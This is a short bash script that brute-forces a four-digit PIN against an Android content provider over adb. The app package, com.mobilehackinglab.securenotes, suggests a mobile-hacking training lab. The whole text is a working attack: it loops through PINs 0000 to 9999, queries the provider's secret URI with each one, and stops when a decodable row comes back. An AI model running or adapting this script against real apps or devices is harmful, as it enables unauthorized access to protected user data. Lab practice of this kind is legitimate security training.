#!/bin/bash

echo "[+] Starting PIN brute-force ..."

for i in $(seq -w 0000 9999); do
    echo -n "Trying PIN: $i "
    adb shell content query --uri "content://com.mobilehackinglab.securenotes.secretprovider" --where "pin=$i" \
            | grep "Row" \
            | grep -v "$(echo -e '\uFFFD')" && break
    echo ''
done

echo "[+] PIN brute-force completed"